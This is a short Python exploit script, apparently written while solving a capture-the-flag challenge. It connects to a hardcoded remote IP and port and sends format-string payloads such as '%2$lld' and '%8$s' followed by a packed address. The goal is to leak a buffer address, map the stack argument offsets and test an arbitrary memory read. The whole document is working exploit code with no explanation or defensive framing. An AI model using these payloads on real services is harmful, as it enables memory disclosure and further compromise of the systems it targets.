#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception as e: return ('<T>'+str(e).encode())

# arg2 = buffer addr
d=ask("%2$lld"); m=re.search(rb'([0-9]+)\n',d); B=int(m.group(1)); print("B=",hex(B))

# verify arg8 reads buffer[8:16]: send 16 A's + %8$lld
d=ask(b"A"*16+b"%8$lld")
print("16A %8$lld =>", repr(d))

# verify arg7 reads buffer[0:8]
d=ask(b"BBBBBBBB" + b"%7$lld")
print("8B %7$lld =>", repr(d))

# now arbitrary read test on fresh pattern: place B at buffer[8:16]
fmt = b"%8$s" + b"CCCC" + struct.pack("<Q", B)
print("arw(B) fmt len=", len(fmt))
d=ask(fmt)
print("arw(B) =>", repr(d))
s.close()
